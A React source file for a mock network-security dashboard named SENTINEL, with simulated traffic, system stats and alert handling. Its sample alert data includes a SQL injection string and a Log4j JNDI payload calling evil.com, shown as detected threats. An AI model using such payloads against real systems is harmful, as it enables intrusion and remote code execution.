import React, { useState, useEffect } from 'react';
import { Dashboard } from './components/Dashboard';
import { Alerts } from './components/Alerts';
import { Alert, Severity, TrafficPoint, SystemStats } from './types';
import { LayoutDashboard, Shield, Settings, Bell, Menu, Activity, Crosshair, Power, Radio } from 'lucide-react';

// --- MOCK DATA ---
const generateMockTraffic = (): TrafficPoint[] => {
  const data: TrafficPoint[] = [];
  const now = new Date();
  for (let i = 20; i >= 0; i--) {
    const t = new Date(now.getTime() - i * 1000);
    data.push({
      time: t.toLocaleTimeString([], { hour12: false, hour: '2-digit', minute:'2-digit', second:'2-digit' }),
      inboundMb: Math.floor(Math.random() * 50) + 10,
      outboundMb: Math.floor(Math.random() * 30) + 5,
      packets: Math.floor(Math.random() * 1000)
    });
  }
  return data;
};

const MOCK_ALERTS: Alert[] = [
  {
    id: 'TX-9901',
    timestamp: new Date(),
    sourceIp: '192.168.1.105',
    destinationIp: '10.0.0.5',
    protocol: 'TCP',
    severity: Severity.HIGH,
    type: 'SQL Injection Attempt',
    payload: "' OR '1'='1' --",
    status: 'NEW'
  },
  {
    id: 'TX-8211',
    timestamp: new Date(Date.now() - 50000),
    sourceIp: '45.33.22.11',
    destinationIp: '10.0.0.2',
    protocol: 'HTTP',
    severity: Severity.CRITICAL,
    type: 'RCE Exploit (Log4j)',
    payload: "${jndi:ldap://evil.com/x}",
    status: 'NEW'
  },
  {
    id: 'TX-2234',
    timestamp: new Date(Date.now() - 120000),
    sourceIp: '172.16.0.4',
    destinationIp: '10.0.0.8',
    protocol: 'UDP',
    severity: Severity.MEDIUM,
    type: 'Port Scan',
    payload: "NMAP SCAN [Ports 20-443]",
    status: 'NEW'
  }
];

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'dashboard' | 'alerts' | 'settings'>('dashboard');
  const [trafficData, setTrafficData] = useState<TrafficPoint[]>(generateMockTraffic());
  const [alerts, setAlerts] = useState<Alert[]>(MOCK_ALERTS);
  const [stats, setStats] = useState<SystemStats>({
    cpu: 12,
    memory: 45,
    activeConnections: 124,
    blockedToday: 89
  });

  useEffect(() => {
    const interval = setInterval(() => {
      setTrafficData(prev => {
        const newData = [...prev.slice(1)];
        const now = new Date();
        newData.push({
          time: now.toLocaleTimeString([], { hour12: false, hour: '2-digit', minute:'2-digit', second:'2-digit' }),
          inboundMb: Math.floor(Math.random() * 60) + 20,
          outboundMb: Math.floor(Math.random() * 40) + 10,
          packets: Math.floor(Math.random() * 1000)
        });
        return newData;
      });

      setStats(prev => ({
        ...prev,
        cpu: Math.min(100, Math.max(5, prev.cpu + Math.floor(Math.random() * 5) - 2)),
        memory: Math.min(100, Math.max(10, prev.memory + Math.floor(Math.random() * 3) - 1)),
        activeConnections: Math.max(50, prev.activeConnections + Math.floor(Math.random() * 10) - 5)
      }));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const handleResolveAlert = (id: string) => {
    setAlerts(prev => prev.filter(a => a.id !== id));
    setStats(prev => ({ ...prev, blockedToday: prev.blockedToday + 1 }));
  };

  const handleSnoozeAlert = (id: string, minutes: number) => {
    setAlerts(prev => prev.map(a => {
      if (a.id === id) {
        return { ...a, snoozedUntil: new Date(Date.now() + minutes * 60 * 1000) };
      }
      return a;
    }));
  };

  const handleUpdateAlert = (updatedAlert: Alert) => {
    setAlerts(prev => prev.map(a => a.id === updatedAlert.id ? updatedAlert : a));
  };

  const displayedAlerts = alerts.filter(a => !a.snoozedUntil || new Date() > a.snoozedUntil);

  return (
    <div className="flex min-h-screen font-body relative overflow-hidden">
      {/* Visual Effects */}
      <div className="scanlines"></div>
      
      {/* Sidebar */}
      <aside className="w-20 lg:w-64 bg-cyber-950 border-r border-cyber-800 flex flex-col fixed h-full z-20 transition-all duration-300">
        <div className="p-6 flex items-center justify-center lg:justify-start border-b border-cyber-800 bg-cyber-900/50">
          <Shield className="w-8 h-8 text-cyber-500 lg:mr-3 animate-pulse-fast" />
          <div className="hidden lg:block">
            <h1 className="text-2xl font-bold tracking-widest text-white font-sans">SENTINEL</h1>
            <p className="text-[10px] text-cyber-500 font-mono tracking-widest">SYS.VER.2.4.0</p>
          </div>
        </div>

        <nav className="flex-1 py-8 space-y-4 px-3">
          {[
            { id: 'dashboard', icon: LayoutDashboard, label: 'OVERVIEW' },
            { id: 'alerts', icon: Bell, label: 'THREATS', count: displayedAlerts.length },
            { id: 'settings', icon: Settings, label: 'CONFIG' }
          ].map((item) => (
            <button 
              key={item.id}
              onClick={() => setActiveTab(item.id as any)}
              className={`
                w-full group relative flex items-center px-3 py-4 rounded-sm transition-all duration-200 border-l-2
                ${activeTab === item.id 
                  ? 'bg-cyber-900 border-cyber-500 text-white shadow-[0_0_15px_rgba(0,240,255,0.1)]' 
                  : 'border-transparent text-gray-500 hover:text-cyber-300 hover:bg-cyber-900/50 hover:border-cyber-300/50'}
              `}
            >
              <item.icon className={`w-6 h-6 lg:mr-4 ${activeTab === item.id ? 'text-cyber-500' : ''}`} />
              <span className="hidden lg:block font-mono text-sm tracking-wider font-bold">{item.label}</span>
              
              {item.count ? (
                <span className="absolute top-2 right-2 flex h-3 w-3">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyber-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-3 w-3 bg-cyber-400"></span>
                </span>
              ) : null}

              {/* Hover line effect */}
              <div className={`absolute bottom-0 left-0 h-[1px] bg-cyber-500 transition-all duration-300 ${activeTab === item.id ? 'w-full' : 'w-0 group-hover:w-full'}`}></div>
            </button>
          ))}
        </nav>

        <div className="p-4 border-t border-cyber-800 bg-cyber-900/30">
          <div className="flex items-center justify-center lg:justify-start space-x-3 text-xs font-mono text-gray-500">
            <Power className="w-4 h-4 text-green-500" />
            <span className="hidden lg:inline text-green-500">ONLINE</span>
            <span className="hidden lg:inline">| 14ms</span>
          </div>
        </div>
      </aside>

      {/* Main Content */}
      <main className="flex-1 ml-20 lg:ml-64 p-4 lg:p-8 overflow-y-auto h-screen custom-scrollbar relative">
         {/* Background Grid Accent */}
         <div className="absolute top-0 right-0 w-[500px] h-[500px] bg-cyber-500/5 rounded-full blur-[100px] pointer-events-none"></div>

         {/* Header */}
         <header className="flex justify-between items-end mb-8 border-b border-cyber-800 pb-4 relative">
            <div>
               <div className="flex items-center space-x-2 mb-1">
                  <Radio className="w-4 h-4 text-cyber-500 animate-pulse" />
                  <span className="text-xs font-mono text-cyber-500 tracking-widest">SECURE_CONNECTION_ESTABLISHED</span>
               </div>
               <h2 className="text-3xl font-bold text-white tracking-wider font-sans uppercase">
                 {activeTab === 'dashboard' && 'Command_Center'}
                 {activeTab === 'alerts' && 'Threat_Vector_Analysis'}
                 {activeTab === 'settings' && 'System_Parameters'}
               </h2>
            </div>
            
            <div className="flex items-center space-x-6">
               <div className="hidden md:block text-right">
                  <div className="text-xs font-mono text-gray-500">LOCAL_TIME</div>
                  <div className="text-xl font-mono text-white">{new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</div>
               </div>
               <div className="h-10 w-10 border border-cyber-500 p-0.5 relative group cursor-pointer">
                  <div className="absolute -top-1 -left-1 w-2 h-2 border-t border-l border-cyber-500"></div>
                  <div className="absolute -bottom-1 -right-1 w-2 h-2 border-b border-r border-cyber-500"></div>
                  <img src="https://ui-avatars.com/api/?name=Admin&background=0a1628&color=00f0ff" alt="Admin" className="w-full h-full opacity-80 group-hover:opacity-100" />
               </div>
            </div>
         </header>

         {/* View Content */}
         <div className="animate-in fade-in zoom-in-95 duration-300 pb-12">
            {activeTab === 'dashboard' && (
               <Dashboard stats={stats} trafficData={trafficData} />
            )}
            
            {activeTab === 'alerts' && (
               <Alerts 
                 alerts={displayedAlerts} 
                 onResolve={handleResolveAlert} 
                 onSnooze={handleSnoozeAlert} 
                 onUpdateAlert={handleUpdateAlert}
               />
            )}

            {activeTab === 'settings' && (
               <div className="flex flex-col items-center justify-center h-[50vh] tech-border">
                  <Settings className="w-24 h-24 text-cyber-800 mb-6 animate-spin-slow" />
                  <h3 className="text-2xl font-bold text-cyber-500 uppercase tracking-widest">Access Restricted</h3>
                  <p className="text-gray-500 font-mono mt-2">Security Clearance Level 5 Required</p>
                  <div className="mt-8 flex space-x-2">
                     <span className="w-2 h-2 bg-cyber-400 rounded-full animate-bounce"></span>
                     <span className="w-2 h-2 bg-cyber-400 rounded-full animate-bounce delay-100"></span>
                     <span className="w-2 h-2 bg-cyber-400 rounded-full animate-bounce delay-200"></span>
                  </div>
               </div>
            )}
         </div>

         {/* Footer Ticker */}
         <div className="fixed bottom-0 left-20 lg:left-64 right-0 h-8 bg-cyber-950 border-t border-cyber-800 flex items-center overflow-hidden z-30">
            <div className="flex whitespace-nowrap animate-marquee">
               <span className="mx-4 text-xs font-mono text-cyber-500">SYSTEM STATUS: NOMINAL</span>
               <span className="mx-4 text-xs font-mono text-gray-600">///</span>
               <span className="mx-4 text-xs font-mono text-gray-400">LAST CHECK: {new Date().toLocaleTimeString()}</span>
               <span className="mx-4 text-xs font-mono text-gray-600">///</span>
               <span className="mx-4 text-xs font-mono text-cyber-300">ENCRYPTION: AES-256</span>
               <span className="mx-4 text-xs font-mono text-gray-600">///</span>
               <span className="mx-4 text-xs font-mono text-gray-400">NODE_ID: US-EAST-04</span>
               <span className="mx-4 text-xs font-mono text-gray-600">///</span>
            </div>
         </div>
      </main>
    </div>
  );
};

export default App;